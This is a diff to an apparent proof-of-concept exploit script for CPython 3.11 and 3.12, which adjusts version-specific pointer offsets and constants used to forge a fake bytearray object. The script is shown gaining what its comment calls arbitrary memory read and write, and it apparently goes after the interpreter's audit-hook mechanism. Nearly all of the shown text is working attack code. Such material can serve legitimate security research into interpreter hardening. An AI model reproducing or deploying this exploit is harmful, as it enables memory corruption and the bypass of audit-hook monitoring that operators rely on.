@@ -1,4 +1,4 @@
-#!/audit_hook_head_finder
+#!./audit_hook_head_finder
 
 import opcode
 import sys
@@ -6,8 +6,10 @@ import os
 from audit_hook_head_finder import add_audit
 
 if sys.version_info[:2] == (3, 12):
-    # PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
-    PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
+    if sys.version_info[2] <= 3:
+        PTR_OFFSET = [24, 48, 0x468f0, -0xc948] # <= 3.12.3
+    else:
+        PTR_OFFSET = [24, 48, 0x46920, -0xc948] # for python3.12.4
 else:
     # there are multiple offsets for 3.11? check the result of POC-no-ctypes.py
     PTR_OFFSET = [24, 48, 0x4d558, 0x3e3d0]
@@ -21,7 +23,9 @@ def p8(x):
 def p64(x):
     return bytes([(x >> i) & 0xff for i in range(0, 64, 8)])
 
-const_tuple = ()
+# Need at least one constant.
+# Only required for python in [3.12.1, 3.12.3]. idk why
+const_tuple = (None,)
 
 # construct the fake bytearray
 fake_bytearray = bytearray(
@@ -56,6 +60,7 @@ magic = foo()  # magic is arbitrary read and write now
 
 add_audit()
 sys.addaudithook(print)
+print("--- finished setup ---")
 
 # get addr from str helper func
 getptr = lambda func: int(str(func).split("0x")[-1].split(">")[0], 16)
